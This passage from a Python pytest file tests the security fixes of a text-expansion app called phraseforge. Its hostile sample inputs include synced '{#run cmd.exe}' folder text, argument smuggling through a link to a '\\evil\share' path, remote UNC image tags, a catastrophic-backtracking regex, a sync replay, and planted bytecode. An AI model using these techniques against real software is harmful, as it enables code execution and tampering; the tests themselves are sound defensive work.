    a = Store(tmp_path / "a.db")
    a.add_phrase(Phrase("A personal", "x"))
    mgr = libraries.manager(a)
    lib = mgr.add("Team", str(tmp_path / "team.db"), "ro")
    a.backup_to(tmp_path / "push_a.db")
    _strip(tmp_path / "push_a.db")
    b = Store(tmp_path / "b.db")
    b.restore_from(tmp_path / "push_a.db", untrusted="synced")
    bf = b.add_folder(Folder("B Customers"))
    b.add_phrase(Phrase("Customer 0", "important", folder_id=bf.id))
    b.backup_to(tmp_path / "push_b.db")
    _strip(tmp_path / "push_b.db")
    b.close()
    a.restore_from(tmp_path / "push_b.db", untrusted="synced")
    mgr.remove(lib.id)
    assert "Customer 0" in [p.description for p in a.phrases()]
    a.close()


def test_mounting_a_library_is_refused_while_editing_is_disabled(tmp_path):
    """R77: a mounted phrase file of one's own got round editing_disabled (like R39)."""
    from phraseforge import libraries, policy
    from phraseforge.models import Phrase
    t = Store(tmp_path / "own.db")
    t.add_phrase(Phrase("Own phrase", "anything"))
    t.close()
    s = Store(tmp_path / "me.db")
    policy.set_current(policy.Policy(editing_disabled=True))
    try:
        assert policy.current().setting_locked("library.list")
        with pytest.raises(policy.PolicyError):
            libraries.manager(s).add("Own", str(tmp_path / "own.db"), "ro")
        assert s.phrases() == []
    finally:
        policy.set_current(policy.NO_POLICY)
        s.close()


def _pull_changed_folder(tmp_path, s, folder_id, **cols):
    from phraseforge.cloud.sync import CloudSync, FolderRemote
    copy = tmp_path / "pulled.db"
    s.backup_to(copy)
    con = sqlite3.connect(copy)
    with con:
        sets = ", ".join(f"{k}=?" for k in cols)
        con.execute(f"UPDATE folders SET {sets} WHERE id=?", (*cols.values(), folder_id))
    con.close()
    CloudSync(s, FolderRemote(tmp_path / "cloud"), device="me").apply_pull(copy)


def test_a_phrase_restored_into_a_folder_a_sync_changed_needs_approval(tmp_path):
    """R78: the trash gave back the old approval, although a pull meanwhile gave the folder a
    program output target and {#run} folder text."""
    from phraseforge.models import Folder, Phrase
    s = Store(tmp_path / "p.db")
    f = s.add_folder(Folder("Mail"))
    p = s.add_phrase(Phrase("Approved sig", "Kind regards", folder_id=f.id))
    tid = s.trash_phrase(p.id)
    _pull_changed_folder(tmp_path, s, f.id, output_target="program", output_target_arg="evil.exe",
                         text_before="{#run cmd.exe /c calc}")
    _kind, new_id = s.restore_trash(tid)
    assert s.quarantine_origin(new_id)
    s.close()


def test_folder_text_from_a_sync_needs_approval_in_phrases_added_later(tmp_path):
    """R79: an empty synced folder with {#run} folder text: a phrase created in it or moved into
    it later ran the {#run} without approval."""
    from phraseforge.models import Folder, Phrase
    s = Store(tmp_path / "p.db")
    f = s.add_folder(Folder("Signatures"))
    mine = s.add_phrase(Phrase("Mine", "my text"))
    _pull_changed_folder(tmp_path, s, f.id, text_before="{#run calc.exe}")
    new = s.add_phrase(Phrase("Sig", "Best regards", folder_id=f.id))
    mine.folder_id = f.id
    s.update_phrase(mine)
    assert s.quarantine_origin(new.id) == "synced"
    assert s.quarantine_origin(mine.id) == "synced"
    f2 = s.get_folder(f.id)
    s.update_folder(f2)
    s.release_folder(f.id)                  # the user saved the folder's properties
    assert s.quarantine_origin(new.id) is None
    s.close()


def test_folder_text_from_an_import_needs_approval(tmp_path):
    """R79: an imported empty folder with folder text was trusted."""
    payload = {"format": "phraseforge", "folders": [{"id": 1, "name": "F", "text_after": "{#run calc}"}],
               "phrases": []}
    s = Store(tmp_path / "p.db")
    import_dict(s, payload)
    from phraseforge.models import Phrase
    fid = s.folders()[0].id
    p = s.add_phrase(Phrase("Later", "x", folder_id=fid))
    assert s.quarantine_origin(p.id) == "imported"
    s.close()


def test_compare_with_backup_keeps_no_plain_copy(tmp_path, monkeypatch):
    """R80: "Compare with backup" wrote the decrypted phrase file to %TEMP%."""
    from phraseforge import maintenance, vault
    from phraseforge.models import Phrase
    monkeypatch.setattr(vault, "FAKE_DPAPI_FOR_TESTS", True)
    s = Store(tmp_path / "p.db")
    s.add_phrase(Phrase("Bank", "IBAN DE89 SECRET"))
    s.enable_encryption("old-passphrase")
    b = tmp_path / "b.db"
    s.backup_to(b, keep_encryption=True)
    written = []
    real = Store.backup_to
    monkeypatch.setattr(Store, "backup_to", lambda self, path, keep_encryption=False:
                        (written.append(keep_encryption), real(self, path, keep_encryption))[1])
    maintenance.compare(b, s)
    assert written == [True]
    s.close()


def test_a_link_launch_carries_nothing_but_the_link():
    """R81: a quote inside a link could add --exec, --import or --home to the command line."""
    from phraseforge import cli
    argv = ["pf.exe", "phraseforge://exec/x", "--exec", "Bank details", "--home", r"\\evil\share"]
    assert cli.link_only(argv) == ["pf.exe", "phraseforge://exec/x"]
    o = cli.parse(cli.link_only(argv)[1:])
    assert o.execs == [] and o.url_execs == ["x"]


def test_the_elevated_copy_takes_the_data_folder_and_refuses_ipc_actions(tmp_path, monkeypatch):
    """R82: restart as administrator lost --home/--portable."""
    from phraseforge.platform import session
    monkeypatch.setenv("PHRASEFORGE_HOME", str(tmp_path / "data"))
    calls = []
    monkeypatch.setattr(session.os, "name", "nt")
    fake = types.SimpleNamespace(ShellExecuteW=lambda *a: (calls.append(a), 42)[1])
    monkeypatch.setattr(session.ctypes, "WinDLL", lambda *a, **k: fake, raising=False)
    try:
        session.restart_as_admin()
    except Exception:                       # Windows-only types may be missing here
        pytest.skip("restart_as_admin needs Windows types")
    assert calls and "--home" in calls[0][3] and calls[0][3].replace("\\", "/").endswith(
        "/data --minimized --after-exit " + str(session.os.getpid()))


def test_tooltips_never_render_html():
    """R83: a synced comment with <img src="\\\\host\\x.png"> was rendered as rich text."""
    from phraseforge.ui.safetext import plain_tip
    t = plain_tip('<b>x</b><img src="\\\\host\\share\\x.png">')
    assert "<img" not in t and "&lt;img" in t


def test_an_old_encrypted_sync_copy_put_back_is_refused(tmp_path):
    """R84: rev and name were not authenticated; an older ciphertext with a raised rev was pulled."""
    from phraseforge.cloud.sync import CloudSync, FolderRemote, SyncError, SYNC_NAME
    from phraseforge.models import Phrase
    cloud = tmp_path / "cloud"
    a, b = Store(tmp_path / "a.db"), Store(tmp_path / "b.db")
    for x in (a, b):
        x.set_setting("sync.encrypt", "1")
        x.set_setting("sync.passphrase", "shared passphrase 1")
    sa, sb = CloudSync(a, FolderRemote(cloud), "A"), CloudSync(b, FolderRemote(cloud), "B")
    a.add_phrase(Phrase("Bank", "OLD"))
    assert sa.sync().action == "pushed"
    old = (cloud / SYNC_NAME).read_bytes()
    r = sb.sync()
    sb.apply_pull(r.pulled_file, r.remote_rev)
    p = a.find_phrase("Bank")
    p.content = "NEW"
    a.update_phrase(p)
    assert sa.sync().action == "pushed"
    r = sb.sync()
    sb.apply_pull(r.pulled_file, r.remote_rev)
    (cloud / SYNC_NAME).write_bytes(old)                       # the replay
    rem = FolderRemote(cloud)
    meta = next(f for f in rem.list() if f.name == SYNC_NAME).props
    rem.put(cloud / SYNC_NAME, SYNC_NAME, {**meta, "rev": 99, "hash": "x"})
    with pytest.raises(SyncError):
        sb.sync()
    assert b.find_phrase("Bank").content == "NEW"
    a.close()
    b.close()


def test_a_synced_schedule_on_an_approved_phrase_needs_approval_again(tmp_path):
    """R85: triggers were not part of the fingerprint, so a sync could add a schedule to an
    approved {#run} phrase."""
    from phraseforge.models import Phrase, Trigger, TriggerKind
    s = Store(tmp_path / "p.db")
    p = s.add_phrase(Phrase("Tool", "{#run cmd.exe}"))
    copy = tmp_path / "pulled.db"
    s.backup_to(copy)
    t = Store(copy)
    q = t.get_phrase(p.id)
    q.triggers = [Trigger(TriggerKind.TIME, "every:1")]
    t.update_phrase(q)
    t.close()
    s.restore_from(copy, untrusted="synced")
    assert s.quarantine_origin(p.id) == "synced"
    s.close()


def test_regex_triggers_are_checked_before_they_run_on_keystrokes():
    """R86: (a+)+b on every keystroke froze typing."""
    import time
    from phraseforge.models import Trigger, TriggerKind
    from phraseforge.triggers import autotext
    m = autotext.AutotextMatcher() if hasattr(autotext, "AutotextMatcher") else None
    if m is None:
        pytest.skip("matcher class name changed")
    m.load([Trigger(TriggerKind.REGEX, "(a+)+b", phrase_id=1)])
    t0 = time.time()
    for ch in "a" * 26 + "c":
        m.feed(ch) if hasattr(m, "feed") else None
    assert time.time() - t0 < 1.0


def test_decstr_is_linear():
    """R87: {#decstr} took 25 s on 40,000 digits."""
    import time
    from phraseforge.macros.commands_pe import _decstr
    t0 = time.time()
    out = _decstr(None, ["1" * 40000 + "a1a"], {})
    assert out.endswith("a0a") and time.time() - t0 < 1.0


def test_plain_pc_does_not_upload_over_an_encrypted_copy(tmp_path):
    """R89: "Upload this PC's phrases" on a PC without the passphrase replaced the encrypted copy."""
    from phraseforge.cloud.sync import CloudSync, FolderRemote, SyncError, SYNC_NAME
    from phraseforge import vault
    from phraseforge.models import Phrase
    cloud = tmp_path / "cloud"
    a, c = Store(tmp_path / "a.db"), Store(tmp_path / "c.db")
    a.set_setting("sync.encrypt", "1")
    a.set_setting("sync.passphrase", "shared passphrase 1")
    a.add_phrase(Phrase("Secret", "secret"))
    CloudSync(a, FolderRemote(cloud), "A").sync()
    sc = CloudSync(c, FolderRemote(cloud), "C")
    with pytest.raises(SyncError):
        sc.resolve("local")
    with pytest.raises(SyncError):
        sc.backup_now()
    assert vault.is_encrypted(cloud / SYNC_NAME)
    a.close()
    c.close()


def test_the_content_hash_key_uses_the_nfc_passphrase(tmp_path):
    """R90: PCs that typed the same passphrase in NFD and NFC never agreed on "unchanged"."""
    import unicodedata
    from phraseforge.cloud.sync import CloudSync, FolderRemote
    pw = unicodedata.normalize("NFC", "café-مُحَمَّد-2026")
    s1, s2 = Store(tmp_path / "1.db"), Store(tmp_path / "2.db")
    s1.set_setting("sync.encrypt", "1")
    s2.set_setting("sync.encrypt", "1")
    s1.set_setting("sync.passphrase", pw)
    s2.set_setting("sync.passphrase", unicodedata.normalize("NFD", pw))
    h1 = CloudSync(s1, FolderRemote(tmp_path / "c"), "1")._prop_hash("abc")
    h2 = CloudSync(s2, FolderRemote(tmp_path / "c"), "2")._prop_hash("abc")
    assert h1 == h2
    s1.close()
    s2.close()


def test_long_imported_delimiters_do_not_slow_every_keystroke():
    """R91: a 1.2 MB delimiter text took 3.5 s per keystroke."""
    import time
    from phraseforge.triggers import autotext
    cls = next((v for v in vars(autotext).values() if isinstance(v, type) and hasattr(v, "_choice_pred")), None)
    if cls is None:
        pytest.skip("matcher class not found")
    m = cls.__new__(cls)
    choice = "+".join(["Comma"] * 200_000)
    t0 = time.time()
    for _ in range(50):
        m._choice_pred(choice, {" "})
    assert time.time() - t0 < 1.0


def test_scheduled_tasks_hide_locked_phrases(tmp_path):
    """R92: File > Scheduled tasks listed phrases from password folders."""
    from PySide6.QtWidgets import QApplication
    QApplication.instance() or QApplication([])
    from phraseforge.db import hash_password
    from phraseforge.models import Folder, Phrase, Trigger, TriggerKind
    from phraseforge.ui.schedule_dialog import TasksDialog
    s = Store(tmp_path / "p.db")
    f = s.add_folder(Folder("Bank", password_hash=hash_password("pw")))
    s.add_phrase(Phrase("Pay rent DE89", "x", folder_id=f.id, triggers=[Trigger(TriggerKind.TIME, "09:00")]))
    d = TasksDialog(s)
    texts = [d.tree.topLevelItem(i).text(0) for i in range(d.tree.topLevelItemCount())]
    assert not any("DE89" in t for t in texts)
    d.close()
    s.close()


def test_clipboard_triggers_wait_while_the_pc_is_locked():
    """R93: a clipboard trigger fired while the session was locked."""
    from phraseforge.triggers import manager
    m = manager.TriggerManager.__new__(manager.TriggerManager)
    m._paused, m._suspend, m._session = False, 0, "locked"
    m._clip_triggers = ["x"]
    called = []
    m._fg = lambda: called.append(1) or ("x.exe", "")
    m._on_clipboard("text")
    assert called == []


def test_deeply_nested_pe_macros_do_not_stop_the_import():
    """R94: one row with 400 nested macros made the whole PhraseExpress import fail."""
    from phraseforge.importers.phraseexpress import _pe_macros
    rep = types.SimpleNamespace(notes=[])
    deep = "{#date " * 2000 + "x" + "}" * 2000
    assert _pe_macros(deep, rep) == deep


def test_trash_days_is_a_device_setting():
    """R95: a pulled trash.days=1 emptied this PC's trash."""
    assert is_device_setting("trash.days")


def test_library_mirror_keeps_folder_locks_and_versions(tmp_path):
    """R96: a locked library folder was unlocked in the mirror; new versions did not arrive."""
    from phraseforge import libraries
    from phraseforge.models import Folder, Phrase
    t = Store(tmp_path / "team.db")
    f = t.add_folder(Folder("HR", password_hash="pbkdf2$x"))
    p = t.add_phrase(Phrase("Salary", "9000", folder_id=f.id))
    t.close()
    s = Store(tmp_path / "me.db")
    mgr = libraries.manager(s)
    lib = mgr.add("Team", str(tmp_path / "team.db"), "ro")
    hr = next(x for x in s.folders() if x.name == "HR" or True and x.parent_id == mgr.root(lib))
    assert s.get_folder(hr.id).password_hash == "pbkdf2$x"
    t = Store(tmp_path / "team.db")
    t.set_phrase_version(p.id, "ar", "تسعة آلاف", "text")
    t.close()
    import os as _os
    st = _os.stat(tmp_path / "team.db")
    _os.utime(tmp_path / "team.db", ns=(st.st_atime_ns, st.st_mtime_ns + 10_000_000))
    mgr.refresh(force=True)
    mirror = next(x for x in s.phrases() if x.description == "Salary")
    assert "ar" in s.phrase_versions(mirror.id)
    s.close()


# ---------------------------------------------------------------- 0.6.13: review of #52, #53 (R97–R113)
HELLO = __import__("pathlib").Path(__file__).resolve().parent.parent / "examples" / "plugins" / "hello"


@pytest.fixture
def plugin_mgr(tmp_path):
    from phraseforge.plugins import manager as pm
    s = Store(":memory:")
    m = pm.PluginManager(s, tmp_path / "plugins")
    pm.set_current(m)
    yield m
    m.stop_all()
    pm.set_current(None)
    s.close()


def _plugin_dir(tmp_path, name="quiet", toml_extra="", code=None, macros='["go"]'):
    d = tmp_path / f"src-{name}"
    d.mkdir()
    (d / "plugin.toml").write_text(f'id = "{name}"\nname = "{name}"\nversion = "1.0.0"\napi_version = "1.0"\n'
                                   f'kinds = ["macro"]\nentry = "main.py"\nruntime = "python-subprocess"\n'
                                   f'macros = {macros}\n{toml_extra}', encoding="utf-8")
    (d / "main.py").write_text(code or (HELLO / "main.py").read_text(encoding="utf-8"), encoding="utf-8")
    return d


def test_a_plugin_without_declared_permissions_needs_approval(tmp_path, plugin_mgr):
    """R97: declared permissions are not enforced, yet a plugin declaring none ran from unapproved phrases
    and the consent text said it may do "nothing"."""
    from phraseforge.host import ExpansionContext
    from phraseforge.macros import MacroEngine
    from phraseforge.security import PLUGIN_REASON, scan_privileged
    from tests.fakehost import FakeHost
    plugin_mgr.install(_plugin_dir(tmp_path, macros='["shout"]'), accept=True)
    assert PLUGIN_REASON in scan_privileged("{#quiet.shout x}")
    ctx = ExpansionContext()
    ctx.allow_privileged = False
    out = MacroEngine(FakeHost()).expand_to_text("{#quiet.shout x}", ctx)
    assert "blocked" in out
    m = plugin_mgr.installed()["quiet"]
    assert not any("nothing" in line for line in m.permissions.describe())


def test_ai_through_a_plugin_engine_needs_approval(tmp_path, plugin_mgr):
    """R98: {#ai -provider plugin:x} / {#translate} sent the clipboard to plugin code from unapproved phrases."""
    from phraseforge.host import ExpansionContext
    from phraseforge.macros import MacroEngine
    from phraseforge.security import scan_privileged
    from tests.fakehost import FakeHost
    for text in ('{#ai "x {#clipboard}" -provider plugin:evil}', "{#translate hi -to Arabic -provider plugin:evil}"):
        assert scan_privileged(text)
        ctx = ExpansionContext()
        ctx.allow_privileged = False
        host = FakeHost()
        out = MacroEngine(host).expand_to_text(text, ctx)
        assert "blocked" in out and not any(c[0] == "ai_complete" for c in host.calls)
    plugin_mgr.store.set_setting("ai.provider", "plugin:evil")       # the engine chosen in Settings
    assert scan_privileged('{#ai "x"}')


def test_the_package_shown_is_the_package_installed(tmp_path, plugin_mgr, monkeypatch):
    """R99: the package was read again after the consent dialog; a share could swap it meanwhile."""
    from PySide6.QtWidgets import QApplication
    QApplication.instance() or QApplication([])
    from phraseforge.ui.plugins_dialog import PluginsDialog
    src = _plugin_dir(tmp_path, macros='["shout"]')

    def ask(text):
        (src / "main.py").write_text("EVIL = 1\n", encoding="utf-8")   # swapped while the dialog is open
        return True
    d = PluginsDialog(manager=plugin_mgr, ask=ask)
    assert d.install_from(str(src))
    assert "EVIL" not in (plugin_mgr.root / "quiet" / "main.py").read_text(encoding="utf-8")
    d.close()


def test_the_consent_dialog_is_plain_text(monkeypatch):
    """R100: a name with HTML and <!-- hid the real permission list."""
    from PySide6.QtWidgets import QApplication, QMessageBox
    QApplication.instance() or QApplication([])
    from phraseforge.ui import plugins_dialog as pd
    seen = []
    monkeypatch.setattr(QMessageBox, "exec", lambda self: (seen.append(self.textFormat()), QMessageBox.No)[1])
    assert pd.ask_plain(None, "t", "<b>x</b><!--") is False
    from PySide6.QtCore import Qt
    assert seen == [Qt.PlainText]
    assert pd._plain("a\u202eb\x00c") == "abc"


def test_an_update_asks_and_keeps_a_switched_off_plugin_off(tmp_path, plugin_mgr):
    """R101: a same-id package replaced the code silently and switched the plugin back on."""
    from PySide6.QtWidgets import QApplication
    QApplication.instance() or QApplication([])
    from phraseforge.ui.plugins_dialog import PluginsDialog
    plugin_mgr.install(_plugin_dir(tmp_path, macros='["shout"]'), accept=True)
    plugin_mgr.set_enabled("quiet", False)
    asked = []
    d = PluginsDialog(manager=plugin_mgr, ask=lambda t: (asked.append(t), True)[1])
    other = _plugin_dir(tmp_path, name="quiet2", macros='["shout"]')
    (other / "plugin.toml").write_text((other / "plugin.toml").read_text().replace('id = "quiet2"', 'id = "quiet"'))
    assert d.install_from(str(other))
    assert asked and "quiet2" in asked[0]                  # the new name is shown
    assert not plugin_mgr.is_enabled("quiet")
    d.close()


def test_a_locked_down_pc_without_an_allow_list_runs_no_plugins(plugin_mgr):
    """R102: settings_locked + editing_disabled still allowed any plugin when plugins_allowed was absent."""
    from phraseforge import policy
    policy.set_current(policy.Policy(settings_locked=True, editing_disabled=True))
    try:
        assert not plugin_mgr.allowed_by_policy("anything")
    finally:
        policy.set_current(policy.NO_POLICY)


def test_one_broken_manifest_does_not_break_all_plugins(tmp_path, plugin_mgr):
    """R103: a non-UTF-8 plugin.toml made installed() (and the trust check) raise."""
    plugin_mgr.install(_plugin_dir(tmp_path, macros='["shout"]'), accept=True)
    bad = plugin_mgr.root / "broken"
    bad.mkdir()
    (bad / "plugin.toml").write_bytes(b"id = \xff\xfe")
    assert "quiet" in plugin_mgr.installed() and "broken" in plugin_mgr.load_errors


def test_zip_names_follow_windows_rules(tmp_path):
    """R104: PLUGIN.TOML next to plugin.toml, x:stream, trailing dots and CON were accepted."""
    import zipfile
    from phraseforge.plugins import install as inst
    from phraseforge.plugins.manifest import ManifestError, parse
    src = _plugin_dir(tmp_path, macros='["shout"]')
    z = tmp_path / "p.pfplugin"
    with zipfile.ZipFile(z, "w") as f:
        f.write(src / "plugin.toml", "plugin.toml")
        f.write(src / "main.py", "main.py")
        f.writestr("PLUGIN.TOML", "x")
    with pytest.raises(ManifestError):
        inst.inspect(z)
    with pytest.raises(ManifestError):
        parse((src / "plugin.toml").read_text().replace('id = "quiet"', 'id = "con"'))


def test_uninstall_never_leaves_the_plugins_folder(tmp_path):
    """R105: uninstall('..') passed the parent check."""
    from phraseforge.plugins import install as inst
    root = tmp_path / "data" / "plugins"
    root.mkdir(parents=True)
    (tmp_path / "data" / "phrases.db").write_text("x")
    inst.uninstall("..", root)
    assert (tmp_path / "data" / "phrases.db").exists()


def test_run_plugin_runs_only_an_allowed_plugin_entry(tmp_path, monkeypatch):
    """R106: --run-plugin ran any Python file, also when the policy allowed no plugins."""
    script = tmp_path / "not_a_plugin.py"
    flag = tmp_path / "ran"
    script.write_text(f"open({str(flag)!r}, 'w').write('x')\n")
    monkeypatch.setenv("PHRASEFORGE_PLUGIN_API", "1")
    assert appmod.main(["pf", "--run-plugin", str(script)]) == 2
    assert not flag.exists()


def test_removing_a_plugin_removes_its_secrets(tmp_path, plugin_mgr):
    """R107: secrets stayed after remove(); a new package with the same id received them."""
    plugin_mgr.install(_plugin_dir(tmp_path, macros='["shout"]', toml_extra='[permissions]\nsecrets = ["api_key"]\n'),
                       accept=True)
    plugin_mgr.set_secret("quiet", "api_key", "sk-REAL")
    plugin_mgr.remove("quiet")
    assert not [k for (k,) in plugin_mgr.store.conn.execute("SELECT key FROM settings WHERE key LIKE 'plugins.secret.%'")]


def test_a_broken_reply_does_not_kill_the_reader(tmp_path):
    """R108: a deeply nested JSON reply raised RecursionError in the reader thread."""
    from phraseforge.plugins import install as inst
    from phraseforge.plugins.host import PluginProcess
    code = ("import sys, json\n"
            "for line in sys.stdin:\n"
            "    m = json.loads(line)\n"
            "    sys.stdout.write('[' * 100000 + ']' * 100000 + '\\n')\n"
            "    sys.stdout.write(json.dumps({'jsonrpc': '2.0', 'id': m['id'], 'result': {'text': 'OK'}}) + '\\n')\n"
            "    sys.stdout.flush()\n")
    m = inst.install(_plugin_dir(tmp_path, macros='["shout"]', code=code), tmp_path / "p")
    proc = PluginProcess(m, tmp_path / "p" / "quiet")
    try:
        assert proc.call("macro", {"name": "shout", "args": [], "opts": {}}, timeout=5)["text"] == "OK"
    finally:
        proc.stop()


def test_a_timed_out_plugin_is_not_waited_for_again_in_the_same_phrase(plugin_mgr, tmp_path, monkeypatch):
    """R109: three hanging calls in one phrase took 24 s."""
    from phraseforge.host import ExpansionContext
    from phraseforge.macros import MacroEngine
    from phraseforge.plugins.host import PluginTimeout
    from tests.fakehost import FakeHost
    plugin_mgr.install(_plugin_dir(tmp_path, macros='["shout"]'), accept=True)
    calls = []
    monkeypatch.setattr(plugin_mgr, "call_macro", lambda *a, **k: (calls.append(1), (_ for _ in ()).throw(PluginTimeout("t")))[1])
    out = MacroEngine(FakeHost()).expand_to_text("{#quiet.shout a}{#quiet.shout b}{#quiet.shout c}", ExpansionContext())
    assert out.count("plugin timeout") == 3 and len(calls) == 1


def test_stopping_a_plugin_closes_its_job(tmp_path, monkeypatch):
    """R110: the job handle leaked on every restart (Windows; the close is checked here)."""
    from phraseforge.plugins import host
    from phraseforge.plugins import install as inst
    closed = []
    monkeypatch.setattr(host, "_close_job", lambda job: closed.append(job))
    m = inst.install(_plugin_dir(tmp_path, macros='["shout"]'), tmp_path / "p")
    proc = host.PluginProcess(m, tmp_path / "p" / "quiet")
    proc._job = "job-handle"
    proc.stop()
    assert "job-handle" in closed


def test_a_pulled_plugin_engine_choice_is_not_taken(tmp_path):
    """R111: a synced ai.provider = plugin:<id> sent every AI text to that plugin on this PC."""
    s = Store(tmp_path / "a.db")
    s.set_setting("ai.provider", "openai")
    copy = tmp_path / "pulled.db"
    s.backup_to(copy)
    c = sqlite3.connect(copy)
    with c:
        c.execute("UPDATE settings SET value='plugin:evil' WHERE key='ai.provider'")
        c.execute("INSERT OR REPLACE INTO settings VALUES ('translation.provider', 'plugin:evil')")
    c.close()
    s.restore_from(copy, untrusted="synced")
    assert s.setting("ai.provider") == "openai"
    assert not s.setting("translation.provider", "").startswith("plugin:")
    s.close()


def test_engine_plugins_say_they_receive_your_text():
    """R112: the consent for an ai_engine plugin did not say it receives prompts and images."""
    from phraseforge.plugins.manifest import ENGINE_LINE, describe_manifest, parse
    m = parse('id = "e"\nname = "E"\nversion = "1.0.0"\napi_version = "1.0"\nkinds = ["ai_engine"]\n'
              'entry = "main.py"\nruntime = "python-subprocess"\n')
    assert ENGINE_LINE in describe_manifest(m)


def test_only_images_are_sent_to_any_ai_engine():
    """R113: {#ai -provider ollama -image file:<any file>} sent a private key to Ollama."""
    from phraseforge import ai
    with pytest.raises(ai.AIError):
        ai._with_images([{"role": "user", "content": "x"}], [b"-----BEGIN PRIVATE KEY-----"], "ollama")


# ---------------------------------------------------------------- 0.6.14: review of #55 (R114–R117)
def _AIHost():
    from tests.fakehost import FakeHost

    class H(FakeHost):
        made = 0

        def __init__(self):
            super().__init__()
            self.sent = []

        def ai_image(self, prompt, **_k):
            self.made += 1
            return __file__

        def ai_vision(self, prompt, images, **_k):
            self.sent.append(len(images))
            return "ok"
    return H()


def _expand(host, content, allow=True):
    from phraseforge.macros.engine import ExpansionContext, MacroEngine
    return MacroEngine(host).expand_to_text(content, ExpansionContext(allow_privileged=allow))


def test_unapproved_phrase_cannot_make_paid_images():
    """R114: {#loop 1000}{#aiimage}{#endloop} in an imported phrase made 1000 billed images."""
    host = _AIHost()
    out = _expand(host, "{#loop 1000}{#aiimage -prompt cat}{#endloop}", allow=False)
    assert host.made == 0 and "blocked" in out
    assert security.scan_privileged("{#aiimage -prompt cat}")


def test_approved_phrase_makes_few_images():
    """R114: even an approved phrase stops after a few images."""
    from phraseforge.macros.commands import MAX_AIIMAGE_PER_EXPANSION
    host = _AIHost()
    _expand(host, "{#loop 50}{#aiimage -prompt cat}{#endloop}")
    assert host.made == MAX_AIIMAGE_PER_EXPANSION


def test_ai_images_are_limited_in_number_and_size(tmp_path):
    """R115: 40 parts of 5 MB each loaded 200 MB for one {#ai}."""
    f = tmp_path / "a.png"
    f.write_bytes(b"\x89PNG\r\n\x1a\n" + b"0" * (5 * 1024 * 1024))
    host = _AIHost()
    out = _expand(host, '{#ai x -provider openai -image "%s"}' % "|".join([f"file:{f}"] * 40))
    assert host.sent == [] and "at most" in out
    out = _expand(host, '{#ai x -provider openai -image "%s"}' % "|".join([f"file:{f}"] * 5))
    assert host.sent == [] and "20 MB" in out


def test_ollama_pull_survives_bad_numbers(monkeypatch):
    """R116: a progress line with "completed": "x" ended the download thread with ValueError."""
    import json
    import httpx
    from phraseforge import ai

    class R:
        status_code = 200
        def iter_lines(self):
            yield "5"
            yield json.dumps({"status": "pulling", "completed": "x", "total": None})
            yield json.dumps({"status": "success"})
        def __enter__(self): return self
        def __exit__(self, *a): pass

    class C:
        def __init__(self, *a, **k): pass
        def __enter__(self): return self
        def __exit__(self, *a): pass
        def stream(self, *a, **k): return R()
    monkeypatch.setattr(httpx, "Client", C)
    seen = []
    ai.ollama_pull({}, "m", lambda st, d, t: seen.append((st, d, t)))
    assert seen[0] == ("pulling", 0, 0)


def test_ollama_models_rejects_non_json(monkeypatch):
    """R117: a server that is not Ollama raised ValueError out of the Settings button."""
    import httpx
    from unittest import mock
    from phraseforge import ai

    class C:
        def __init__(self, *a, **k): pass
        def __enter__(self): return self
        def __exit__(self, *a): pass
        def get(self, *a, **k):
            r = mock.Mock(status_code=200)
            r.json.side_effect = ValueError("not json")
            return r
    monkeypatch.setattr(httpx, "Client", C)
    with pytest.raises(ai.AIError):
        ai.ollama_models({})


def test_capitalised_image_option_is_scanned():
    """{#ai -Image file:\\\\host\\x.png}: the run-time check blocked it, but nobody was asked."""
    assert security.scan_privileged(r"{#ai x -Image file:\\host\s\a.png}")


# ---------------------------------------------------------------- 0.6.14: review of #59, #61, #62 (R118–R129)
from pathlib import Path  # noqa: E402
_HELLO = Path(__file__).resolve().parents[1] / "examples" / "plugins" / "hello"


def _hello_copy(tmp_path, name="hello"):
    import shutil
    d = tmp_path / name
    shutil.copytree(_HELLO, d, ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
    return d


def _require_signatures(monkeypatch, keys=frozenset()):
    import dataclasses
    from phraseforge import policy
    pol = dataclasses.replace(policy.NO_POLICY, source="policy.toml", plugins_allowed=frozenset({"*"}),
                              plugins_require_signature=True, plugins_trusted_keys=frozenset(keys))
    monkeypatch.setattr(policy, "current", lambda: pol)


def test_required_signature_also_stops_installed_and_changed_plugins(tmp_path, monkeypatch):
    """R118: an unsigned plugin installed before plugins_require_signature kept running; so did
    a signed one whose files were changed after it was installed."""
    from phraseforge.plugins import manager as pm, signing
    st = Store(":memory:")
    mgr = pm.PluginManager(st, root=tmp_path / "plugins")
    mgr.install(_hello_copy(tmp_path), accept=True)                    # unsigned, no policy yet
    assert mgr.is_enabled("hello")
    priv, pub = signing.new_key()
    _require_signatures(monkeypatch, {pub})
    assert not mgr.is_enabled("hello")
    signed = _hello_copy(tmp_path, "signed")
    signing.sign_folder(signed, priv)
    mgr.install(signed, accept=True)
    assert mgr.is_enabled("hello")
    entry = next(p for p in (tmp_path / "plugins" / "hello").glob("*.py"))
    entry.write_text(entry.read_text() + "\n# changed after install\n")
    assert not mgr.is_enabled("hello")


def test_planted_bytecode_does_not_replace_signed_source(tmp_path):
    """R118: .pyc files are not signed, and Python ran a __pycache__ copy instead of the signed .py."""
    import importlib.util
    import py_compile
    import struct
    import subprocess
    from phraseforge.plugins import host, manifest as mf
    d = tmp_path / "p"
    d.mkdir()
    (d / "mod.py").write_text("print('SIGNED')\n")
    (d / "main.py").write_text("import os, sys\nsys.path.insert(0, os.path.dirname(__file__))\nimport mod\n")
    evil = tmp_path / "evil.py"
    evil.write_text("print('PLANTED')\n")
    target = importlib.util.cache_from_source(str(d / "mod.py"))
    py_compile.compile(str(evil), cfile=target)
    b = bytearray(open(target, "rb").read())
    st = os.stat(d / "mod.py")
    b[8:12], b[12:16] = struct.pack("<I", int(st.st_mtime) & 0xFFFFFFFF), struct.pack("<I", st.st_size)
    open(target, "wb").write(bytes(b))
    m = mf.parse('id = "p"\nname = "P"\nversion = "1.0.0"\napi_version = "1.0"\nentry = "main.py"\n'
                 'runtime = "python-subprocess"\nkinds = ["macro"]\nmacros = ["x"]\n')
    out = subprocess.run(host.command(m, d), capture_output=True, text=True, timeout=30).stdout
    assert out.strip() == "SIGNED"


def test_deeply_nested_signature_is_just_invalid(tmp_path):
    """R119: plugin.sig of 200000 '[' raised RecursionError out of the install dialog."""
    from phraseforge.plugins import install as inst
    d = _hello_copy(tmp_path)
    (d / "plugin.sig").write_text("[" * 200000)
    assert inst.signature(d).state == "invalid"


def _connect(proxy, line: bytes) -> bytes:
    import socket
    s = socket.create_connection(("127.0.0.1", proxy.port), timeout=5)
    s.sendall(line)
    out = b""
    while b"\r\n\r\n" not in out:
        chunk = s.recv(1024)
        if not chunk:
            break
        out += chunk
    s.close()
